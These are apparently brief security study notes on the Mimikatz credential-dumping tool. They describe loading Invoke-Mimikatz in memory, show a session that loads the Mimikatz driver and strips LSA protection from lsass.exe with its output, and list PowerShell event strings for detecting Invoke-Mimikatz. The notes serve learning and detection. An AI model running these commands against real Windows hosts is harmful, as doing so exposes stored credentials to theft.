## Mimikatz Tool


### PowerShell & Mimikatz:
---
`Invoke-Mimikatz` loads Mimikatz DLL directly into memory (DLL is embeded in the script), and executed from memory without touching disk.

### LSA Protection
---
A Windows feature that enables protecting LSASS process. Mimikatz can still bypass this with a driver (“!+”).
```powershell
mimikatz# privilege::debug
Privilege '20' OK

mimikatz# !+
[*]mimikatz driver not present
[*]mimikatz driver succesfully loaded
[*]mimikatz driver ACL to everyone
[*]mimikatz driver started

mimikatz# !processprotect /process:lsass.exe /remove
Process: lsass.exe
PID 492 -> 00/00 [0-0-0]
```

### Detecting Invoke-Mimikats
---
PArse PowerShell Events for
- `System.Reflection.AssemblyName`
- `System.Reflection.Emit.AssemblyBuilderAccess`
- `System.Runtime.InteropServices.MarshalAsAttribute`
- `TOKEN_PRIVILEGES`
- `SE_PRIVILEGE_ENABLED`

